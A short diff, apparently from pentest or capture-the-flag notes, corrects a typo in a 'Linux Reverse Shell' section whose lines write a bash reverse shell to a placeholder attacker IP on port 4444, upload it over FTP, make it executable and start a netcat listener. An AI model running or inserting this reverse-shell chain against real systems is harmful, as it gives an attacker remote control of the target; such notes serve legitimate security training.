@@ -68,7 +68,7 @@ run
 
 #### Linux Reverse Shell
 ```
-cho "bash -i >& /dev/tcp/<attacker-IP>/4444 0>&1" > shell.sh
+echo "bash -i >& /dev/tcp/<attacker-IP>/4444 0>&1" > shell.sh
 ftp> put shell.sh
 ftp> chmod +x shell.sh
 ftp> !nc -lvnp 4444
